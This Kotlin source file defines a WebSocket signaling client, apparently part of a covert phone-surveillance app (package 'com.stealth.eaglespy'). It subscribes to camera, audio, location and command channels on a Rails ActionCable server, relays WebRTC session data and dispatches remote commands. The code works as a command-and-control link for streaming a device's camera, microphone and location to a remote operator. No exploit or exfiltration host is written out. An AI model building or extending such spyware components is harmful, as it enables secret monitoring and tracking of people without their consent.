package com.stealth.eaglespy.webrtc

import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * WebSocket Signaling Client
 * Connects to Rails ActionCable for WebRTC signaling and command dispatch
 */
class SignalingClient(
    private val serverUrl: String,
    private val deviceId: String,
    private val channelType: String // "camera", "audio", "location", "command"
) {

    interface Listener {
        fun onConnected()
        fun onOffer(sdp: String)
        fun onAnswer(sdp: String)
        fun onIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int)
        fun onDisconnected()
        fun onError(message: String)
    }

    interface CommandListener {
        fun onCommand(command: String, params: JSONObject)
    }

    private var webSocket: WebSocket? = null
    private var listener: Listener? = null
    private var commandListener: CommandListener? = null
    private val client = OkHttpClient.Builder()
        .pingInterval(30, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS) // No timeout for WebSocket
        .build()

    private var isSubscribed = false

    fun setListener(listener: Listener) {
        this.listener = listener
    }

    fun setCommandListener(listener: CommandListener) {
        this.commandListener = listener
    }

    fun connect() {
        val request = Request.Builder()
            .url(serverUrl)
            .header("X-Device-Id", deviceId)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                subscribe()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
                listener?.onDisconnected()
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                listener?.onError(t.message ?: "Unknown error")
                listener?.onDisconnected()
            }
        })
    }

    fun disconnect() {
        unsubscribe()
        webSocket?.close(1000, "Client disconnect")
        webSocket = null
        isSubscribed = false
    }

    private fun subscribe() {
        val channelName = when (channelType) {
            "camera", "audio" -> "StreamingChannel"
            "location" -> "LocationChannel"
            "command" -> "CommandChannel"
            else -> "StreamingChannel"
        }

        val subscribeMessage = JSONObject().apply {
            put("command", "subscribe")
            put("identifier", JSONObject().apply {
                put("channel", channelName)
                put("device_id", deviceId)
                put("stream_type", channelType)
            }.toString())
        }

        webSocket?.send(subscribeMessage.toString())
    }

    private fun unsubscribe() {
        if (!isSubscribed) return

        val channelName = when (channelType) {
            "camera", "audio" -> "StreamingChannel"
            "location" -> "LocationChannel"
            "command" -> "CommandChannel"
            else -> "StreamingChannel"
        }

        val unsubscribeMessage = JSONObject().apply {
            put("command", "unsubscribe")
            put("identifier", JSONObject().apply {
                put("channel", channelName)
                put("device_id", deviceId)
            }.toString())
        }

        webSocket?.send(unsubscribeMessage.toString())
    }

    private fun handleMessage(text: String) {
        try {
            val json = JSONObject(text)
            
            when {
                // Subscription confirmation
                json.optString("type") == "confirm_subscription" -> {
                    isSubscribed = true
                    listener?.onConnected()
                }

                // Channel message
                json.has("message") -> {
                    val message = json.getJSONObject("message")
                    val type = message.optString("type")

                    when (type) {
                        "offer" -> {
                            val sdp = message.optString("sdp")
                            listener?.onOffer(sdp)
                        }
                        "answer" -> {
                            val sdp = message.optString("sdp")
                            listener?.onAnswer(sdp)
                        }
                        "ice_candidate" -> {
                            val candidate = message.optString("candidate")
                            val sdpMid = message.optString("sdpMid")
                            val sdpMLineIndex = message.optInt("sdpMLineIndex")
                            listener?.onIceCandidate(candidate, sdpMid, sdpMLineIndex)
                        }
                        "command" -> {
                            val action = message.optString("action")
                            val params = message.optJSONObject("params") ?: JSONObject()
                            commandListener?.onCommand(action, params)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            listener?.onError("Parse error: ${e.message}")
        }
    }

    // Send methods
    fun sendOffer(sdp: String) {
        sendChannelMessage(JSONObject().apply {
            put("action", "offer")
            put("sdp", sdp)
        })
    }

    fun sendAnswer(sdp: String) {
        sendChannelMessage(JSONObject().apply {
            put("action", "answer")
            put("sdp", sdp)
        })
    }

    fun sendIceCandidate(candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        sendChannelMessage(JSONObject().apply {
            put("action", "ice_candidate")
            put("candidate", candidate)
            put("sdpMid", sdpMid)
            put("sdpMLineIndex", sdpMLineIndex)
        })
    }

    fun sendMessage(action: String, data: JSONObject) {
        sendChannelMessage(JSONObject().apply {
            put("action", action)
            put("data", data)
        })
    }

    private fun sendChannelMessage(data: JSONObject) {
        if (!isSubscribed) return

        val channelName = when (channelType) {
            "camera", "audio" -> "StreamingChannel"
            "location" -> "LocationChannel"
            "command" -> "CommandChannel"
            else -> "StreamingChannel"
        }

        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", channelName)
                put("device_id", deviceId)
                put("stream_type", channelType)
            }.toString())
            put("data", data.toString())
        }

        webSocket?.send(message.toString())
    }
}
